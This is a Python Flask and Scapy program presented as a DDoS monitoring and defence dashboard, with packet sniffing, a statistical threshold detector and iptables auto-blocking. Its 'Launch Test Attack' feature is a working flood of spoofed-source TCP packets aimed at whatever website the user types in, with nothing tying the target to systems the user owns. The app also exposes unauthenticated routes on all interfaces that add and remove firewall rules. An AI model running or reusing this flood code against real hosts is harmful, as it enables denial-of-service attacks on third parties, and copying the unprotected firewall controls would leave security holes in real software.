import os
import time
import threading
import logging
import socket
import subprocess
import random
from collections import defaultdict, deque
from scapy.all import sniff, IP, TCP, send
from flask import Flask, jsonify, render_template, request, redirect, url_for
import numpy as np

# --- Configuration and Global Variables ---

# Setup logging to a file
logging.basicConfig(filename='ddos_dashboard.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Detection Parameters
TIME_WINDOW = 10
HISTORY_WINDOW = 60
REQUEST_THRESHOLD_MULTIPLIER = 3

# Attack Simulation Parameters
SIM_PACKETS_PER_IP = 500
SIM_NUM_IPS = 50
SIM_DURATION_PER_IP = 5

# Global state variables
TARGET_IP = None
TARGET_URL = None
# Using a dictionary for thread management
threads = {
    "sniffer": None,
    "analyzer": None,
    "attack": None
}
stop_event = threading.Event()

# Data storage
traffic_data = defaultdict(lambda: deque(maxlen=TIME_WINDOW * 5))
history_data = defaultdict(lambda: deque(maxlen=HISTORY_WINDOW))
attack_logs = deque(maxlen=20)
blocked_ips = set() # Store IPs that are currently blocked

# --- HTML Templates (as strings) ---

INDEX_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DDoS Dashboard - Setup</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style> body { font-family: 'Inter', sans-serif; } </style>
</head>
<body class="bg-gray-900 text-white flex items-center justify-center min-h-screen">
    <div class="w-full max-w-md p-8 space-y-6 bg-gray-800 rounded-xl shadow-lg">
        <h1 class="text-3xl font-bold text-center text-cyan-400">DDoS Control Dashboard</h1>
        <p class="text-center text-gray-400">
            Enter a target URL to monitor traffic, simulate attacks, and apply defensive blocking.
        </p>
        <form action="/start" method="post" class="space-y-6">
            <div>
                <label for="url" class="text-sm font-medium text-gray-300">Target Website URL</label>
                <input type="text" id="url" name="url"
                       class="mt-1 block w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-md focus:ring-cyan-500 focus:border-cyan-500"
                       placeholder="e.g., example.com" required>
            </div>
            <button type="submit"
                    class="w-full px-4 py-2 font-semibold text-white bg-cyan-600 rounded-md hover:bg-cyan-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-cyan-500 focus:ring-offset-gray-800 transition-colors">
                Start Monitoring
            </button>
        </form>
        <p class="text-xs text-center text-gray-500">
            Disclaimer: For educational purposes only. Requires root/admin privileges.
        </p>
    </div>
</body>
</html>
"""

MONITOR_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DDoS Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; }
        .log-entry { animation: fadeIn 0.5s ease-in-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="bg-gray-900 text-white p-4 md:p-8">
    <div class="max-w-7xl mx-auto">
        <header class="flex flex-wrap justify-between items-center mb-6">
            <div>
                <h1 class="text-3xl font-bold text-cyan-400">DDoS Dashboard</h1>
                <p class="text-gray-400">Monitoring & Defending: <strong class="text-cyan-300">{{ target_url }}</strong> ({{ target_ip }})</p>
            </div>
            <a href="/stop" class="mt-4 md:mt-0 px-4 py-2 font-semibold text-white bg-red-600 rounded-md hover:bg-red-700 transition-colors">
                Stop & Unblock All
            </a>
        </header>

        <main class="grid grid-cols-1 lg:grid-cols-5 gap-6">
            <div class="lg:col-span-3 grid gap-6">
                <div class="bg-gray-800 p-6 rounded-xl shadow-lg">
                    <h2 class="text-xl font-semibold mb-4">Live Traffic by Source IP</h2>
                    <div class="h-80"><canvas id="trafficChart"></canvas></div>
                </div>
                <div class="bg-gray-800 p-6 rounded-xl shadow-lg">
                    <h2 class="text-xl font-semibold mb-4">Detection Log</h2>
                    <div id="logContainer" class="space-y-3 h-72 overflow-y-auto pr-2">
                        <p class="text-gray-500">Waiting for events...</p>
                    </div>
                </div>
            </div>

            <div class="lg:col-span-2 grid gap-6">
                <div class="bg-gray-800 p-6 rounded-xl shadow-lg">
                    <h2 class="text-xl font-semibold mb-4 text-orange-400">Attack Simulation</h2>
                     <form action="/attack" method="post" class="space-y-4">
                        <p class="text-sm text-gray-400">Launch a simulated DDoS attack against the target to test defenses.</p>
                        <button type="submit" id="attackBtn"
                                class="w-full px-4 py-2 font-semibold text-white bg-orange-600 rounded-md hover:bg-orange-700 transition-colors">
                            Launch Test Attack
                        </button>
                    </form>
                    <p id="attackStatus" class="text-sm text-yellow-400 mt-3"></p>
                </div>
                <div class="bg-gray-800 p-6 rounded-xl shadow-lg">
                    <h2 class="text-xl font-semibold mb-4 text-red-400">Blocked IPs</h2>
                    <div id="blockedIpContainer" class="space-y-2 h-72 overflow-y-auto pr-2">
                        <p class="text-gray-500">No IPs blocked yet.</p>
                    </div>
                </div>
            </div>
        </main>
    </div>

    <script>
        const ctx = document.getElementById('trafficChart').getContext('2d');
        const trafficChart = new Chart(ctx, {
            type: 'bar', data: { labels: [], datasets: [{ label: 'Requests in Time Window', data: [], backgroundColor: 'rgba(22, 163, 224, 0.5)', borderColor: 'rgba(22, 163, 224, 1)', borderWidth: 1 }] },
            options: { responsive: true, maintainAspectRatio: false, scales: { y: { beginAtZero: true, ticks: { color: '#d1d5db' }, grid: { color: 'rgba(255, 255, 255, 0.1)' } }, x: { ticks: { color: '#d1d5db' }, grid: { color: 'rgba(255, 255, 255, 0.1)' } } }, plugins: { legend: { labels: { color: '#d1d5db' } } } }
        });
        
        const logContainer = document.getElementById('logContainer');
        const blockedIpContainer = document.getElementById('blockedIpContainer');
        const attackStatus = document.getElementById('attackStatus');
        const attackBtn = document.getElementById('attackBtn');

        async function updateData() {
            try {
                const response = await fetch('/data');
                if (!response.ok) return;
                const data = await response.json();

                // Update Chart
                trafficChart.data.labels = data.ips;
                trafficChart.data.datasets[0].data = data.counts;
                trafficChart.update();

                // Update Logs
                if (data.attack_logs && data.attack_logs.length > 0) {
                    if (logContainer.querySelector('.text-gray-500')) { logContainer.innerHTML = ''; }
                    const existingLogs = new Set(Array.from(logContainer.children).map(p => p.textContent));
                    data.attack_logs.forEach(log => {
                        if (!existingLogs.has(log)) {
                            const p = document.createElement('p');
                            p.className = 'p-2 bg-yellow-900/50 rounded-md text-sm log-entry';
                            p.textContent = log;
                            logContainer.prepend(p);
                        }
                    });
                }
                
                // Update Blocked IPs
                if (data.blocked_ips && data.blocked_ips.length > 0) {
                    if (blockedIpContainer.querySelector('.text-gray-500')) { blockedIpContainer.innerHTML = ''; }
                    const existingIps = new Set(Array.from(blockedIpContainer.children).map(div => div.dataset.ip));
                    data.blocked_ips.forEach(ip => {
                        if (!existingIps.has(ip)) {
                             const div = document.createElement('div');
                             div.dataset.ip = ip;
                             div.className = 'flex justify-between items-center p-2 bg-red-900/50 rounded-md text-sm log-entry';
                             div.innerHTML = `<span>${ip}</span><a href="/unblock/${ip}" class="px-2 py-1 text-xs bg-gray-600 hover:bg-gray-500 rounded">Unblock</a>`;
                             blockedIpContainer.prepend(div);
                        }
                    });
                } else {
                     if (!blockedIpContainer.querySelector('.text-gray-500')) {
                        blockedIpContainer.innerHTML = '<p class="text-gray-500">No IPs blocked yet.</p>';
                     }
                }
                
                // Update Attack Status
                attackStatus.textContent = data.attack_status;
                attackBtn.disabled = data.attack_status.includes("in progress");


            } catch (error) { console.error("Error fetching data:", error); }
        }
        setInterval(updateData, 2000);
    </script>
</body>
</html>
"""

# --- Core Logic ---

def setup_templates():
    if not os.path.exists('templates'):
        os.makedirs('templates')
    with open('templates/index.html', 'w', encoding='utf-8') as f: f.write(INDEX_HTML)
    with open('templates/monitor.html', 'w', encoding='utf-8') as f: f.write(MONITOR_HTML)

# --- DETECTION LOGIC ---
def packet_detector(packet):
    if stop_event.is_set() or TARGET_IP is None: return
    if packet.haslayer(IP):
        ip_src, ip_dst = packet[IP].src, packet[IP].dst
        if ip_src == TARGET_IP or ip_dst == TARGET_IP:
            traffic_data[ip_src].append(time.time())

def traffic_analyzer():
    while not stop_event.is_set():
        current_time = time.time()
        for ip, timestamps in list(traffic_data.items()):
            recent_requests = [ts for ts in timestamps if current_time - ts <= TIME_WINDOW]
            traffic_data[ip] = deque(recent_requests, maxlen=traffic_data[ip].maxlen)
            
            num_requests = len(recent_requests)
            history_data[ip].append(num_requests)

            if len(history_data[ip]) > 10:
                mean_requests = np.mean(history_data[ip])
                stddev_requests = np.std(history_data[ip])
                dynamic_threshold = mean_requests + REQUEST_THRESHOLD_MULTIPLIER * stddev_requests
                min_threshold = 20

                if num_requests > dynamic_threshold and num_requests > min_threshold:
                    if ip not in blocked_ips:
                        log_message = f"DDoS pattern from {ip}: {num_requests} reqs (>{dynamic_threshold:.2f}). Blocking IP."
                        logging.info(log_message)
                        if not any(log_message in s for s in attack_logs):
                            attack_logs.append(f"{time.strftime('%H:%M:%S')} - {log_message}")
                            block_ip(ip) # AUTO-BLOCK
        time.sleep(1)

def start_detection_threads():
    if threads["sniffer"] and threads["sniffer"].is_alive(): return
    
    stop_event.clear()
    threads["analyzer"] = threading.Thread(target=traffic_analyzer, daemon=True)
    threads["sniffer"] = threading.Thread(target=lambda: sniff(prn=packet_detector, filter=f"host {TARGET_IP}", store=0, stop_filter=lambda p: stop_event.is_set()), daemon=True)
    threads["analyzer"].start()
    threads["sniffer"].start()
    print(f"DETECTION: Started sniffing and analysis for {TARGET_IP}")

# --- BLOCKING LOGIC ---
def run_command(command):
    try:
        subprocess.run(command, check=True, shell=False, capture_output=True, text=True)
        return True, ""
    except subprocess.CalledProcessError as e:
        error_message = f"Error executing: {' '.join(command)}\n{e.stderr}"
        print(error_message)
        logging.error(error_message)
        return False, e.stderr

def block_ip(ip):
    if ip in blocked_ips or ip == TARGET_IP: return
    print(f"BLOCKING: Attempting to block IP {ip}")
    success, _ = run_command(["iptables", "-A", "INPUT", "-s", ip, "-j", "DROP"])
    if success:
        blocked_ips.add(ip)
        print(f"SUCCESS: Blocked {ip}")
        attack_logs.append(f"{time.strftime('%H:%M:%S')} - Blocked malicious IP: {ip}")

def unblock_ip(ip):
    if ip not in blocked_ips: return
    print(f"UNBLOCKING: Attempting to unblock IP {ip}")
    success, _ = run_command(["iptables", "-D", "INPUT", "-s", ip, "-j", "DROP"])
    if success:
        blocked_ips.remove(ip)
        print(f"SUCCESS: Unblocked {ip}")

def unblock_all():
    print("UNBLOCKING: Clearing all blocked IPs.")
    # Create a copy to iterate over as we modify the set
    for ip in list(blocked_ips):
        unblock_ip(ip)
    blocked_ips.clear()


# --- ATTACK LOGIC ---
def send_packets_from_ip(source_ip, target_ip, packets, duration):
    if stop_event.is_set(): return
    for _ in range(packets):
        if stop_event.is_set(): break
        packet = IP(src=source_ip, dst=target_ip) / TCP(sport=random.randint(1024, 65535), dport=80)
        send(packet, verbose=0)
        time.sleep(duration / packets)

def simulate_ddos(target_ip):
    global threads
    print(f"ATTACK: Simulating DDoS on {target_ip} from {SIM_NUM_IPS} IPs...")
    attack_threads = []
    for i in range(SIM_NUM_IPS):
        if stop_event.is_set():
            print("ATTACK: Simulation stopped prematurely.")
            break
        source_ip = f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"
        t = threading.Thread(target=send_packets_from_ip, args=(source_ip, target_ip, SIM_PACKETS_PER_IP, SIM_DURATION_PER_IP))
        t.start()
        attack_threads.append(t)
    
    for t in attack_threads: t.join()
    
    if not stop_event.is_set():
        print("ATTACK: Simulation finished.")
    threads["attack"] = None # Mark as finished

# --- FLASK WEB APPLICATION ---
app = Flask(__name__)
app.secret_key = os.urandom(24)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start():
    global TARGET_IP, TARGET_URL
    if threads["sniffer"] and threads["sniffer"].is_alive():
        stop() # Stop previous monitoring session
    
    # Clear all previous data
    traffic_data.clear()
    history_data.clear()
    attack_logs.clear()
    unblock_all()

    TARGET_URL = request.form.get('url')
    if not TARGET_URL: return "URL is required.", 400
    try:
        TARGET_IP = socket.gethostbyname(TARGET_URL)
        print(f"Resolved {TARGET_URL} to {TARGET_IP}")
    except socket.gaierror:
        return "Could not resolve IP for the given domain.", 400
    
    start_detection_threads()
    return redirect(url_for('monitor'))

@app.route('/monitor')
def monitor():
    if not TARGET_IP: return redirect(url_for('index'))
    return render_template('monitor.html', target_url=TARGET_URL, target_ip=TARGET_IP)

@app.route('/data')
def get_data():
    if not TARGET_IP: return jsonify({"ips": [], "counts": [], "attack_logs": [], "blocked_ips": []})
    
    current_time = time.time()
    sorted_traffic = sorted(traffic_data.items(), key=lambda item: len([ts for ts in item[1] if current_time - ts <= TIME_WINDOW]), reverse=True)
    top_traffic = sorted_traffic[:20]
    ips = [ip for ip, timestamps in top_traffic]
    counts = [len([ts for ts in timestamps if current_time - ts <= TIME_WINDOW]) for ip, timestamps in top_traffic]
    
    attack_status = "Idle"
    if threads["attack"] and threads["attack"].is_alive():
        attack_status = "Attack in progress..."

    return jsonify({
        "ips": ips, "counts": counts,
        "attack_logs": list(attack_logs),
        "blocked_ips": list(blocked_ips),
        "attack_status": attack_status
    })

@app.route('/attack', methods=['POST'])
def attack():
    global threads
    if TARGET_IP and (not threads["attack"] or not threads["attack"].is_alive()):
        threads["attack"] = threading.Thread(target=simulate_ddos, args=(TARGET_IP,), daemon=True)
        threads["attack"].start()
    return redirect(url_for('monitor'))

@app.route('/unblock/<ip>')
def unblock(ip):
    unblock_ip(ip)
    return redirect(url_for('monitor'))

@app.route('/stop')
def stop():
    global TARGET_IP, TARGET_URL, threads
    stop_event.set()

    # Wait for threads to finish
    for thread_name in ["sniffer", "analyzer", "attack"]:
        if threads[thread_name] and threads[thread_name].is_alive():
            threads[thread_name].join(timeout=2)
        threads[thread_name] = None
    
    unblock_all() # Unblock all IPs on stop
    
    TARGET_IP = None
    TARGET_URL = None
    print("MONITORING STOPPED by user. All IPs unblocked.")
    return redirect(url_for('index'))

def has_admin_privileges():
    if os.name == 'nt':
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin()
    else:
        return os.geteuid() == 0

if __name__ == "__main__":
    if not has_admin_privileges():
        print("❌ ERROR: This script requires root/administrator privileges for packet sniffing and firewall modification.")
        print("Please run it with 'sudo' (on Linux/macOS) or as an Administrator (on Windows).")
    else:
        print("✅ Script running with sufficient privileges.")
        setup_templates()
        print("🌍 Web interface is available at http://127.0.0.1:5000")
        # Use a production-ready server like waitress or gunicorn for real deployments
        app.run(host='0.0.0.0', port=5000)